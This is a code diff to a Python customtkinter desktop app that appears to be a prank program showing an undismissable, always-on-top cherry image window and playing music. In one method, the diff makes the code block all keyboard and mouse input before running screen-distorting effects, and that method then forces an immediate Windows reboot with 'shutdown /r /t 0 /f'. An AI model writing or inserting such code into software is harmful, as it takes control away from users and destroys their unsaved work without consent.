@@ -12,6 +12,8 @@ current_folder = os.path.dirname(os.path.realpath(__file__))
 assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
 
 mixer.init()
+mixer.music.load('assets/cherry.mp3')
+
 
 customtkinter.set_appearance_mode("System")  # Modes: system (default), light, dark
 customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green
@@ -40,7 +42,9 @@ class App(customtkinter.CTk):
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
 
-        self.new_window()
+        for i in range(1):
+            self.cherry_window()
+            
 
         self.logo = customtkinter.CTkImage(Image.open(os.path.join(assets, "poggers.webp")), size=(26, 26))
 
@@ -164,15 +168,15 @@ class App(customtkinter.CTk):
         angle = 0
         size = 1
         speed = 5
-        for i in range(15):
+        ctypes.windll.user32.BlockInput(True)
+        for i in range(10):
             win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx,dy, win32con.SCRAND)
             dx = math.ceil(math.sin(angle) * size * 10)
             dy = math.ceil(math.cos(angle) * size * 10)
             angle += speed / 10
             if angle > math.pi :
                 angle = math.pi * -1
-        ctypes.windll.user32.BlockInput(True)
-        time.sleep(0.5)
+        
         os.system('shutdown /r /t 0 /f')
 
     def devs_button_event(self):
@@ -200,12 +204,18 @@ class App(customtkinter.CTk):
         else:
             self.about_frame.grid_forget()
 
-    def new_window(self):
+    def cherry_window(self):
         top = customtkinter.CTkToplevel()
         top.title("cherry")
         top.geometry("144x144")
 
-        cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')))
+        cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')), size=(144,144))
+
+        label = customtkinter.CTkLabel(top, image=cherry, text="", height=144)
+        label.grid(row=0, column=0, sticky="nsew")
+
+        top.attributes("-topmost", True)
+        top.attributes("-disabled", True)
 
 
 if __name__ == "__main__":
